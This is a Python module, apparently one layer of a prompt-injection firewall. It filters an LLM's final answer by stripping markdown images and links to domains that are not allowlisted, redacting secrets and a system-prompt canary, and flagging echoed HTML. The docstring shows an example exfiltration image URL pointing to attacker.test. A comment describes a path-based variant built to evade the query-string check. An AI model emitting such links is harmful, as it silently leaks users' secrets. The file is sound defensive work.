"""Layer 4: filter what reaches the user.

The final answer is itself an exfiltration channel. A markdown image is the classic
example: many chat clients fetch `![x](https://attacker.test/log?d=SECRET)` automatically,
so the secret leaves the system with no click and nothing visible to the user. Links are
the same attack with one click of friction.

So this layer:
  * strips or neutralizes markdown images/links to non-allowlisted domains,
  * redacts secrets and the canary before display,
  * flags raw HTML (hidden elements echoed back from a page are a sign the model is
    repeating attacker content).

Note the ordering constraint: redaction happens BEFORE link neutralization would render
a URL as text, so a secret embedded in a URL is redacted rather than merely un-clicked.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from src.firewall import canary as canary_mod
from src.firewall.gating import redact_secrets

_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\((\s*<?)([^)\s]+)([^)]*)\)")
_MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\((\s*<?)([^)\s]+)([^)]*)\)")
_BARE_URL = re.compile(r"https?://[^\s)\"'<>]+")
_HTML_TAG = re.compile(r"<(script|iframe|img|div|span|style|object|embed)\b[^>]*>", re.I)
_HTML_COMMENT = re.compile(r"<!--.*?-->", re.S)


@dataclass
class FilterResult:
    text: str
    modified: bool = False
    reasons: list[str] = field(default_factory=list)
    removed_urls: list[str] = field(default_factory=list)

    def note(self, reason: str) -> None:
        self.modified = True
        if reason not in self.reasons:
            self.reasons.append(reason)


def _domain_of(url: str) -> str:
    return re.sub(r"^https?://([^/]+).*$", r"\1", url).lower()


def _allowed(url: str, allowed_domains: list[str]) -> bool:
    domain = _domain_of(url)
    return any(domain == d.lower() or domain.endswith("." + d.lower()) for d in allowed_domains)


# A path segment that looks like an identifier rather than a word: long, and mixing
# character classes or containing a secret-like prefix. Ordinary URLs ("/blog/how-to-cook")
# use short lowercase words, so this stays quiet on them.
_TOKEN_SEGMENT = re.compile(r"^(?=.{12,})(?:[A-Za-z0-9+/_-]*\d[A-Za-z0-9+/_-]*)$")


def _opaque_path_segment(url: str) -> bool:
    """True if any path segment looks like encoded data rather than a readable path."""
    path = re.sub(r"^https?://[^/]+", "", url)
    for segment in path.split("/"):
        segment = segment.strip()
        if len(segment) >= 12 and _TOKEN_SEGMENT.match(segment):
            # Require some entropy: a mix of cases or digits-and-letters, not "2026-01-01".
            if sum(ch.isdigit() for ch in segment) and sum(ch.isalpha() for ch in segment):
                return True
    return False


def filter_output(
    text: str,
    policy: dict,
    secrets: dict[str, str] | None = None,
    canary: str | None = None,
) -> FilterResult:
    """Apply the output policy to the model's final answer."""
    cfg = policy.get("output_filter", {}) if policy else {}
    allowed = cfg.get("allowed_link_domains", []) or []
    result = FilterResult(text or "")

    if not result.text:
        return result

    # 1a. Canary FIRST. A canary leak means the system prompt escaped, which is a distinct
    # and more serious finding than "some secret appeared". If generic secret redaction ran
    # first it would scrub the token and hide that signal from the audit log.
    if cfg.get("redact_canary", True) and canary:
        if canary_mod.detect(result.text, canary):
            result.text = canary_mod.redact(result.text, canary)
            result.note("system-prompt canary detected and redacted (prompt leak)")

    # 1b. Then other secrets, before link handling, so a secret inside a URL is redacted
    # rather than merely made un-clickable.
    if cfg.get("redact_secrets", True) and secrets:
        redacted = redact_secrets(result.text, secrets)
        if redacted != result.text:
            result.text = redacted
            result.note("redacted secret value from output")

    # 2. Markdown images: these auto-load, so strip them entirely.
    if cfg.get("strip_markdown_images", True):
        def _strip_image(match: re.Match) -> str:
            url = match.group(3)
            if _allowed(url, allowed):
                return match.group(0)
            result.removed_urls.append(url)
            result.note(f"removed markdown image to non-allowlisted domain ({_domain_of(url)})")
            return f"[image removed: {_domain_of(url)}]"
        result.text = _MD_IMAGE.sub(_strip_image, result.text)

    # 3. Links: keep the text, defuse the URL.
    if cfg.get("neutralize_external_links", True):
        def _neutralize(match: re.Match) -> str:
            label, url = match.group(1), match.group(3)
            if _allowed(url, allowed):
                return match.group(0)
            result.removed_urls.append(url)
            result.note(f"neutralized link to non-allowlisted domain ({_domain_of(url)})")
            return f"{label} [link removed: {_domain_of(url)}]"
        result.text = _MD_LINK.sub(_neutralize, result.text)

        def _neutralize_bare(match: re.Match) -> str:
            url = match.group(0)
            if _allowed(url, allowed):
                return url
            # A bare URL only matters if it carries data; otherwise leave it readable.
            if "?" in url or "#" in url:
                result.removed_urls.append(url)
                result.note(f"stripped query data from bare URL ({_domain_of(url)})")
                return re.split(r"[?#]", url)[0] + " [query removed]"
            # Data can also ride in the PATH, not just the query string. Found by the
            # adaptive attack `adapt_path_exfil`, which was written to evade the rule
            # above: https://attacker.test/ref/<SECRET> carries just as much as ?d=<SECRET>.
            # A long, high-entropy path segment on a non-allowlisted host is the signal.
            if _opaque_path_segment(url):
                result.removed_urls.append(url)
                result.note(f"stripped opaque path data from bare URL ({_domain_of(url)})")
                return f"https://{_domain_of(url)}/ [path removed]"
            return url
        result.text = _BARE_URL.sub(_neutralize_bare, result.text)

    # 4. Raw HTML in the answer usually means the model echoed page content back.
    if cfg.get("flag_html", True):
        if _HTML_COMMENT.search(result.text):
            result.text = _HTML_COMMENT.sub("", result.text)
            result.note("removed HTML comment echoed from untrusted content")
        tag = _HTML_TAG.search(result.text)
        if tag:
            result.note(f"output contains raw HTML (<{tag.group(1)}>), possibly echoed page content")

    return result
